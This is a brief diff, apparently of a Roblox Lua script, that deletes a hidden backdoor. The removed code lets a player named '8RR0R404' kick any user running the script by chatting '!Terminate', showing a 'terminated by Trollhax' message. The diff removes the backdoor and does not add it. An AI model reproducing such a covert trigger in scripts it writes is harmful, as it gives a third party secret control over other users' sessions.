@@ -4,24 +4,3 @@
 
 -- Moderate
 
-local Players = game:GetService("Players")
-
-for _, player in ipairs(Players:GetPlayers()) do
-    if player.Name == "8RR0R404" then
-        player.Chatted:Connect(function(message)
-        if message == "!Terminate" then
-        game.Players.LocalPlayer:Kick("Your connection has been terminated by Trollhax.")
-        end
-        end)
-    end
-end
-
-Players.PlayerAdded:Connect(function(player)
-    if player.Name == "8RR0R404" then
-        player.Chatted:Connect(function(message)
-        if message == "!Terminate" then
-        game.Players.LocalPlayer:Kick("Your connection has been terminated by Trollhax.")
-        end
-        end)
-    end
-end)
